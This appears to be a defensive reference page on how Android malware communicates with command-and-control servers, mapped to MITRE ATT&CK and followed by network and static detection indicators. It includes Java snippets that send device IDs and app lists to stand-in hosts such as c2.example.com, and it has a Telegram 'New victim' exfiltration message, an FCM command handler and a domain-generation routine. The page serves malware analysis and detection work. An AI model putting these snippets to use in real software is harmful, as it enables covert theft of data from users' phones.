# C2 Communication Techniques

How Android malware talks to its command-and-control infrastructure. The C2 channel determines how commands reach the device, how stolen data leaves, and how resilient the operation is against takedowns. Most families use multiple channels for redundancy.

See also: [Network Traffic Interception](network-traffic-interception.md), [Anti-Analysis Techniques](anti-analysis-techniques.md#domain-generation-algorithms)

??? abstract "MITRE ATT&CK"

    | ID | Technique | Tactic |
    |---|---|---|
    | [T1437](https://attack.mitre.org/techniques/T1437/) | Application Layer Protocol | Command and Control |
    | [T1481](https://attack.mitre.org/techniques/T1481/) | Web Service | Command and Control |
    | [T1521](https://attack.mitre.org/techniques/T1521/) | Encrypted Channel | Command and Control |
    | [T1637.001](https://attack.mitre.org/techniques/T1637/001/) | Dynamic Resolution: Domain Generation Algorithms | Command and Control |
    | [T1644](https://attack.mitre.org/techniques/T1644/) | Out of Band Data | Command and Control |

    Sub-techniques: [T1481.001](https://attack.mitre.org/techniques/T1481/001/) Dead Drop Resolver, [T1481.002](https://attack.mitre.org/techniques/T1481/002/) Bidirectional Communication (Telegram, MQTT), [T1481.003](https://attack.mitre.org/techniques/T1481/003/) One-Way Communication (FCM push).

??? warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | [`INTERNET`](../permissions/normal/internet.md) (auto-granted, normal protection level) |
    | Optional | [`RECEIVE_SMS`](../permissions/sms/receive-sms.md) for SMS-based C2, [`RECEIVE_BOOT_COMPLETED`](../permissions/normal/receive-boot-completed.md) for persistent reconnection |
    | Infrastructure | At least one C2 server, domain, or third-party service account |

## C2 Methods

### HTTP/HTTPS REST APIs

The most common C2 channel. Malware sends HTTP POST requests to a hardcoded or dynamically resolved endpoint, typically JSON-encoded. The C2 responds with commands in the same format.

```java
URL url = new URL("https://c2.example.com/gate.php");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setRequestProperty("Content-Type", "application/json");
conn.setDoOutput(true);

JSONObject payload = new JSONObject();
payload.put("bot_id", deviceId);
payload.put("action", "register");
payload.put("apps", installedPackages);

OutputStream os = conn.getOutputStream();
os.write(payload.toString().getBytes());
os.flush();
```

Advantages: works through any network, blends with normal traffic, easy to implement. Disadvantages: requires active server, domains can be seized, traffic is inspectable if pinning is absent.

Used by: [BRATA](../malware/families/brata.md), [Hydra](../malware/families/hydra.md), [Cerberus](../malware/families/cerberus.md), [Octo](../malware/families/octo.md), most banking trojans.

### WebSocket Persistent Connections

Maintains a persistent bidirectional connection for real-time command delivery. The C2 server can push commands instantly without polling.

```java
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder()
    .url("wss://c2.example.com/ws")
    .build();

WebSocket ws = client.newWebSocket(request, new WebSocketListener() {
    @Override
    public void onMessage(WebSocket webSocket, String text) {
        JSONObject cmd = new JSONObject(text);
        executeCommand(cmd.getString("type"), cmd);
    }
});
```

Lower latency than polling HTTP. Enables interactive remote access sessions -- screen streaming, real-time VNC. Connection drop is immediately visible to both sides.

Used by: [Hook](../malware/families/hook.md), [Medusa](../malware/families/medusa.md), [Octo](../malware/families/octo.md) v2.

### Firebase Cloud Messaging (FCM)

Abuses Google's push notification infrastructure as a C2 wake-up channel. The malware registers with FCM using the attacker's Firebase project credentials, then receives push messages containing commands. FCM traffic is indistinguishable from legitimate app notifications.

```java
FirebaseMessaging.getInstance().getToken()
    .addOnCompleteListener(task -> {
        String token = task.getResult();
        sendTokenToC2(token);
    });
```

```java
public class C2MessagingService extends FirebaseMessagingService {
    @Override
    public void onMessageReceived(RemoteMessage message) {
        Map<String, String> data = message.getData();
        String command = data.get("cmd");
        String args = data.get("args");
        executeCommand(command, args);
    }
}
```

Google can revoke the Firebase project, but the attacker just creates a new one. The malware often uses FCM only as a wake-up signal, then connects back to the primary HTTP C2 for actual data transfer.

Used by: [Ermac](../malware/families/ermac.md), [Cerberus](../malware/families/cerberus.md), [GodFather](../malware/families/godfather.md), [Anatsa](../malware/families/anatsa.md).

### Telegram Bot API

Uses Telegram's Bot API for bidirectional C2. The malware contains a bot token and chat ID, sends stolen data as Telegram messages, and polls `getUpdates` for commands. Telegram's infrastructure provides built-in encryption, CDN distribution, and censorship resistance.

??? example "Telegram Bot API C2 Implementation"

    ```java
    String botToken = "6234871:AAF...encrypted_token";
    String chatId = "-100198765432";
    String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";

    JSONObject payload = new JSONObject();
    payload.put("chat_id", chatId);
    payload.put("text", "New victim: " + deviceId + "\nApps: " + appList);

    HttpPost post = new HttpPost(apiUrl);
    post.setEntity(new StringEntity(payload.toString()));
    ```

Telegram C2 is hard to take down because blocking api.telegram.org disrupts legitimate Telegram usage. The bot token can be rotated easily if compromised.

Used by: [Anubis](../malware/families/anubis.md), [Mamont](../malware/families/mamont.md), [Cerberus](../malware/families/cerberus.md) (dead drop), [SpyNote](../malware/families/spynote.md) (some variants).

### Dead Drop Resolvers

The malware does not hardcode the C2 address directly. Instead, it fetches the real C2 URL from a public service that the attacker controls. If the C2 goes down, the attacker updates the dead drop with a new address without needing to update the malware.

Common dead drop platforms:

| Platform | Method | Example |
|----------|--------|---------|
| Telegram | Public channel with pinned message containing encrypted C2 URL | Channel bio or pinned post has Base64-encoded address |
| Pastebin | Paste containing encrypted/encoded C2 address | `https://pastebin.com/raw/XXXXXX` |
| GitHub | Repository file or gist with C2 info | README or config file in a public repo |
| Twitter/X | Tweet or bio containing encoded address | Profile bio with hex-encoded URL |
| YouTube | Video description with hidden C2 string | Comment or description field |

[Cerberus](../malware/families/cerberus.md) stored encrypted C2 URLs in a Twitter bio. [GodFather](../malware/families/godfather.md) used Telegram channel descriptions. [MoqHao](../malware/families/moqhao.md) used Pinterest profile descriptions.

!!! tip "Dead Drop Analysis"

    When you find a dead drop resolver, check if the attacker is still actively updating the public profile. Extracting historical dead drop values (via Wayback Machine or platform-specific caches) can reveal the full list of C2 servers used over the campaign's lifetime.

### DNS Tunneling and DNS-over-HTTPS

Encodes C2 data inside DNS queries. The malware makes DNS lookups for subdomains like `base64data.evil.com`, and the authoritative DNS server decodes the subdomain to extract data. Responses come back as TXT or CNAME records.

DNS-over-HTTPS (DoH) variant sends DNS queries as HTTPS requests to resolvers like `https://dns.google/resolve?name=...`, bypassing traditional DNS monitoring entirely. This doubles as a way to resolve DGA domains without touching the device's configured DNS.

Less common on Android than on desktop malware due to implementation complexity, but observed in targeted espionage tools.

### MQTT Protocol

Lightweight publish/subscribe messaging protocol designed for IoT. Some malware families use public MQTT brokers (like mqtt.eclipseprojects.io) for C2, publishing commands to bot-specific topics.

Low overhead, persistent connections, works well on unreliable mobile networks. Hard to distinguish from legitimate IoT traffic.

### SMS-Based C2

The malware receives commands via incoming SMS messages from a specific number or matching a specific format. Older technique, still used as a fallback when internet connectivity is unavailable.

Commands are typically short codes: `#lock#`, `#sms_forward#ON`, `#wipe#`. The malware's `BroadcastReceiver` intercepts the SMS before the default messaging app displays it.

Disadvantages: sender number is traceable, SMS costs money at scale, limited payload size.

Used by: [BankBot](../malware/families/bankbot.md), early [Anubis](../malware/families/anubis.md) variants, [Rafel RAT](../malware/families/rafelrat.md).

### SFTP/FTP Exfiltration

Direct file upload for exfiltrating large data: screen recordings, keylog files, photo archives. The malware connects to an attacker-controlled SFTP server and uploads files on a schedule or when triggered.

[Vultur](../malware/families/vultur.md) uses SFTP (via JSch library) specifically for uploading screen recordings, keeping its HTTP C2 channel separate for commands.

### Proxy/Tunnel C2

The infected device acts as a network proxy, routing attacker traffic through the victim's connection. [McAfee documented TimpDoor](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-timpdoor-turns-mobile-devices-into-hidden-proxies/) (2018), distributed via SMS phishing as a fake voice-message app, which created a SOCKS proxy and redirected traffic through an SSH-encrypted tunnel. Over 5,000 devices were enrolled, giving attackers stealthy access through residential IP addresses. This turns compromised phones into a proxy botnet for masking other malicious activity.

### Tor/Onion Routing

Routes C2 traffic through the Tor network, hiding the server's real IP address. The malware either bundles Tor libraries or uses Orbot as a proxy. The C2 runs as a .onion hidden service.

Adds significant latency and battery drain. Increases APK size if Tor is bundled. Some families use Tor only for C2 registration and fall back to direct HTTPS for data transfer.

### Domain Generation Algorithms (DGA)

The malware generates a list of pseudo-random domain names using a seed (date, hardcoded value, or external input). The attacker registers one or more of these domains ahead of time. If a domain is seized, the algorithm generates new candidates the next day.

```java
public String generateDomain(int dayOfYear, int year) {
    long seed = (dayOfYear * 1000L) + year;
    Random rng = new Random(seed);
    StringBuilder domain = new StringBuilder();
    int len = rng.nextInt(8) + 8;
    for (int i = 0; i < len; i++) {
        domain.append((char) ('a' + rng.nextInt(26)));
    }
    domain.append(".com");
    return domain.toString();
}
```

The defender must reverse the DGA to predict and preemptively sinkhole future domains. DGA is less common on Android than on desktop botnets, but has been observed in [Anubis](../malware/families/anubis.md) and [FluBot](../malware/families/flubot.md).

### Certificate Pinning on C2 Traffic

Malware pinning its own C2 server's certificate to prevent interception by analysts or network security tools. The attacker embeds the server certificate or public key hash in the APK and rejects any connection where the certificate doesn't match.

This is the reverse of the usual scenario: instead of a legitimate app pinning its server, the malware pins the attacker's server. An analyst running mitmproxy sees the connection fail unless they patch out the pinning logic first.

!!! info "Bypassing Malware Certificate Pinning"

    Use Frida's `ssl_pinning_bypass.js` or patch the APK's `TrustManager` / `CertificatePinner` at the smali level. See [Hooking](../reversing/hooking.md) for Frida-based approaches and [Network Analysis](../reversing/network-analysis.md) for mitmproxy setup.

## C2 Method Comparison

| Method | Stealth | Reliability | Latency | Bandwidth | Takedown Resistance |
|--------|---------|-------------|---------|-----------|-------------------|
| HTTP/HTTPS | Medium | High | Low | High | Low -- domain seizure |
| WebSocket | Medium | Medium | Very Low | High | Low |
| FCM | Very High | High | Low | Low | Medium -- project revocation |
| Telegram Bot | High | Very High | Medium | Medium | High |
| Dead Drop | High | Medium | High | Very Low | High |
| DNS Tunnel | Very High | Medium | High | Very Low | High |
| MQTT | High | Medium | Low | Medium | Medium |
| SMS | Low | Low | Medium | Very Low | Low -- traceable |
| SFTP/FTP | Low | High | Medium | Very High | Low |
| Tor | Very High | Low | Very High | Medium | Very High |
| DGA | Medium | Medium | High | High | High |

## Families by Primary C2 Type

| Family | Primary C2 | Secondary C2 | Exfiltration |
|--------|-----------|-------------|--------------|
| [Anubis](../malware/families/anubis.md) | HTTP REST | Telegram Bot | HTTP POST |
| [Ermac](../malware/families/ermac.md) | HTTP REST | FCM wake-up | HTTP POST |
| [Hook](../malware/families/hook.md) | WebSocket | HTTP REST | WebSocket |
| [Cerberus](../malware/families/cerberus.md) | HTTP REST | Telegram dead drop, FCM | HTTP POST |
| [Medusa](../malware/families/medusa.md) | WebSocket | HTTP REST | WebSocket |
| [SpyNote](../malware/families/spynote.md) | Custom TCP | None | TCP socket |
| [Vultur](../malware/families/vultur.md) | HTTP REST | FCM wake-up | SFTP |
| [Mamont](../malware/families/mamont.md) | Telegram Bot | None | Telegram API |
| [BRATA](../malware/families/brata.md) | HTTP REST | None | HTTP POST |
| [GodFather](../malware/families/godfather.md) | HTTP REST | Telegram dead drop, FCM | HTTP POST |
| [Octo](../malware/families/octo.md) | HTTP REST | WebSocket (v2) | HTTP POST |
| [Hydra](../malware/families/hydra.md) | HTTP REST | None | HTTP POST |
| [Anatsa](../malware/families/anatsa.md) | HTTP REST | FCM wake-up | HTTP POST |
| [FluBot](../malware/families/flubot.md) | HTTP REST + DGA | DNS-based DGA | HTTP POST |
| [MoqHao](../malware/families/moqhao.md) | HTTP REST | Dead drop (Pinterest/Imgur) | HTTP POST |
| [Xenomorph](../malware/families/xenomorph.md) | HTTP REST | None | HTTP POST |
| [Chameleon](../malware/families/chameleon.md) | HTTP REST | None | HTTP POST |
| [TrickMo](../malware/families/trickmo.md) | HTTP REST | None | HTTP POST |
| [Copybara](../malware/families/copybara.md) | HTTP REST | MQTT | HTTP POST |

## Network Analysis

### Intercepting C2 Traffic

Setting up mitmproxy to capture C2 communications during dynamic analysis:

1. Install mitmproxy CA certificate on the test device
2. Configure Wi-Fi proxy or use transparent proxy with iptables
3. If malware pins its C2 certificate, patch the APK to remove pinning (Frida `ssl_pinning_bypass.js` or manual smali edit)
4. Monitor for registration beacons, command polling intervals, and exfiltration uploads

### Identifying C2 Patterns

Common indicators in network traffic:

- Periodic POST requests to the same endpoint (heartbeat/polling)
- JSON payloads containing device identifiers, IMEI, installed app lists
- Base64-encoded or encrypted request bodies
- Requests to `api.telegram.org` with bot tokens
- FCM registration tokens sent to non-Google servers
- Connections to known MQTT brokers
- DNS queries for high-entropy domain names (DGA indicator)
- WebSocket upgrades to suspicious endpoints

## Detection During Analysis

??? example "Static Indicators"

    - Hardcoded URLs, IPs, or domain patterns in strings/resources
    - Telegram bot tokens (format: `[0-9]+:AA[A-Za-z0-9_-]+`)
    - Firebase configuration files (`google-services.json`) with unexpected project IDs
    - JSch or other SSH/SFTP library imports
    - `WebSocketListener` or OkHttp WebSocket usage
    - `DnsOverHttps` or custom DNS resolution code
    - Certificate pinning implementations (custom `TrustManager`, `CertificatePinner`)

??? example "Dynamic Indicators"

    - Outbound connections immediately after first launch
    - Periodic network requests at fixed intervals
    - Data sent to Telegram API endpoints
    - Large file uploads to SFTP servers
    - Connections to Tor entry nodes or .onion addresses
